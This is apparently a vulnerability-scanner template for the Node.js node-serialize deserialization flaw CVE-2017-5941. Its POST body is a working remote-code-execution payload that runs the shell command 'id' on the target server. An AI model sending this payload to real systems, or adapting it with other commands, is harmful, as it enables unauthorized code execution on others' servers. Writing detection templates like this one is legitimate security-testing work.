id: nodejs-cve-2017-5941
info:
  name: Node.js Deserialization RCE (CVE-2017-5941)
  author: grok
  severity: critical
  description: Detects Node.js applications vulnerable to CVE-2017-5941, allowing RCE via node-serialize deserialization.
  reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941
  tags: nodejs,rce,cve
  
http:
  - method: POST
    path:
      - "{{BaseURL}}/"
    headers:
      Content-Type: application/json
    body: |
      {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id', function(error, stdout, stderr) { console.log(stdout) });}()"}
      
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "uid="
          - "gid="
        condition: and
      - type: status
        status:
          - 200